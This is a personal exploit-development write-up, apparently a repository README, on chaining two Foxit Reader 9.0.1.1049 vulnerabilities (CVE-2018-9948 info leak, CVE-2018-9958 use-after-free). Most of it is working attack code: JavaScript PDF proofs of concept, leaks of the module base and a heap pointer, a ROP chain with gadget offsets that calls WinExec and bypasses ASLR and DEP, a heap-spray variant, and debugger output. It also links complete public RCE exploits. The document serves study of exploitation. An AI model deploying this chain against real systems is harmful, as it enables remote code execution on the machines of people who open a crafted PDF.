# [CVE-2018-9958 + CVE-2018-9948](https://www.exploit-db.com/exploits/45163)

Foxit Reader 9.0.1.1049 Full Chain Exploit, making use of 2 CVEs - 1 information leak and 1 use after free to obtain code execution, bypassing ASLR and DEP. There are 2 ways to abuse the UAF and obtain code execution: either via a heap spray or via leaking a heap pointer which points to our shellcode. 

Take note that the `.pdf` file that I have created does not result in RCE, it is merely the culminiation of my research on these CVEs which would lead to RCE (basically its incomplete). The completed versions can be found in the references. This is similar to the [Windows UaF](../Foundational-Resources/Windows-Heap-Spray/) exploits I have made to learn about how to abuse and exploit UaF vulnerabilities to gain EIP control.

### CVE-2018-9948 Information Leak via Uninitialized Pointers

Proof-of-Concept:

```
var int32View = new Int32Array(0x6c);
app.alert(util.printf("Uninitialized: 0x%04x", int32View[0]));
```

- Mine alerted with `e0e0e0e0` (I think it depends on whether page heap is enabled or not) 

- To analyse uninitialised buffers (ub), we can use the `bridgeit` script though it is a little buggy: you run bridgit and you open pdf, need to pause and g to trigger the dumping of logs.

Final Code:

```
function leak_everything(){
    ...
    var ab = new ArrayBuffer(0x5c);
    var intAb = new Int32Array(ab);
    var leaked = intAb[0] & 0xffff0000;
    foxit_base = leaked - 0x01f50000;
    ...
}
```

We can also abuse this vulnerability to leak a heap pointer, to do this, we need to: leak a heap chunk pointer from the text annotation which was (ab)used for the uninitialized TypedArray. Then, reclaim that memory with a TypeArray, setting its contents to a stack pivot and setting the reclaimed objectâ€™s fake vtable to this leaked address, thus avoiding a heap spray.

```
function leak_everything(){
    ...
    for (var i = 0; i < num_of_abs; i++){
        say_no_to_heap_spray[i] = new Int32Array(new ArrayBuffer(0x40));
    }
    ...
    for (var i = 0; i < num_of_abs; i++){
        for (var j = 0; j < say_no_to_heap_spray[i].length; j++){
            say_no_to_heap_spray[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4 // 02c7ee23
        }
    }
    ...
}
```

- The text annotation can be allocated and freed via `var a = this.addAnnot({type: "Text"}); a.destroy();`

- We then reclaim the space via `var test = new ArrayBuffer(0x60); var stolen = new Int32Array(test);`

- At index 1 of the `stolen` variable stores the location of the heap chunk pointer of size 0x40 `heap_ptr = stolen[1];` 

### CVE-2018-9958 Text Annotations Use-After-Free 

```
var a = this.addAnnot({type:"Text", page: 0, name:"uaf"});
var arr  = [1];
var that = this;
Object.defineProperties(arr,{
    "0":{ 
        get: function () {

            // free the annotation
            that.getAnnot(0, "uaf").destroy();
            return 1; 
        }
    }
});
a.point = arr;
```

- Use the normal method to find the space to reclaim the space

### Exploitation Technique #1 - Heap Leak to UaF

```
function use_heap_leak(){ 
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new ArrayBuffer(0x5c);
        var rop = new Int32Array(arr[i]);
        for (var j = 0x0; j < rop.length; j++) {
            rop[0x00] = heap_ptr;                // pointer to our stack pivot from the TypedArray leak
            rop[0x01] = foxit_base + 0x01a11d09; // xor ebx,ebx; or [eax],eax; ret
            rop[0x02] = 0x72727272;              // junk
            rop[0x03] = foxit_base + 0x00001450  // pop ebp; ret
            rop[0x04] = 0xffffffff;              // ret of WinExec
            rop[0x05] = foxit_base + 0x0069a802; // pop eax; ret
            rop[0x06] = foxit_base + 0x01f2257c; // IAT WinExec
            rop[0x07] = foxit_base + 0x0000c6c0; // mov eax,[eax]; ret
            rop[0x08] = foxit_base + 0x00049d4e; // xchg esi,eax; ret
            rop[0x09] = foxit_base + 0x00025cd6; // pop edi; ret
            rop[0x0a] = foxit_base + 0x0041c6ca; // ret
            rop[0x0b] = foxit_base + 0x000254fc; // pushad; ret
            rop[0x0c] = 0x636c6163;              // calc
            rop[0x0d] = 0x00000000;              // adios, amigo
        }
    }
}
```

- After we leak a heap pointer to a 0x40 sized chunk which is filled with the stack pointers

- `ecx` is where the vtable is stored (and is where our ROP chain will be at)

- `rop[0x00]` is basically `073419a8`

    ```
    (df8.16b4): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=41414141 ebx=00000000 ecx=073419a8 edx=24508001 esi=074a8068 edi=074a4270
    eip=014bcfbb esp=0012e3cc ebp=0012e3e4 iopl=0         nv up ei pl nz ac pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210216
    FoxitReader!CertFreeCertificateChain+0x150bdb:
    014bcfbb 8b5008          mov     edx,dword ptr [eax+8] ds:0023:41414149=????????
    0:000> dd @ecx
    073419a8  41414141 41414141 41414141 41414141
    073419b8  41414141 41414141 41414141 41414141
    073419c8  41414141 41414141 41414141 41414141
    073419d8  41414141 41414141 41414141 41414141
    073419e8  41414141 41414141 41414141 41414141
    073419f8  41414141 41414141 41414141 41414141
    07341a08  58c64fcb 8c000000 00000001 00000026
    07341a18  00000027 003a005a 0072005c 00730065
    ```

### Exploitation Technique #2 - Heap Spray to UaF

```
function use_heap_spray(){ 
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new ArrayBuffer(0x5c);
        var rop = new Int32Array(arr[i]);
        for (var j = 0x0; j < rop.length; j++) {
            rop[j] = 0x1b000048-0x8;
        }
    }
}
```

- Similar methodology as exploitation technique #2

### References:

- [Exploit Code](https://www.exploit-db.com/exploits/45163)

- [Download Link](https://www.filepuma.com/download/foxit_pdf_reader_9.0.1.1049-17632/)

- [srcincite write up](https://srcincite.io/blog/2018/06/22/foxes-among-us-foxit-reader-vulnerability-discovery-and-exploitation.html)

- [Precision Heap Spray on Foxit](https://github.com/SpiralBL0CK/Foxit-Precise-Heap-Spray/blob/main/spray.js)

- [srcincite poc which pwns win7 and win10 using heap chunk pointer](https://srcincite.io/pocs/cve-2018-99%7B48,58%7D.pdf.txt)

- [poc which uses heap spray + proper shellcode](https://github.com/manojcode/Foxit-Reader-RCE-with-virualalloc-and-shellcode-for-CVE-2018-9948-and-CVE-2018-9958/tree/master)

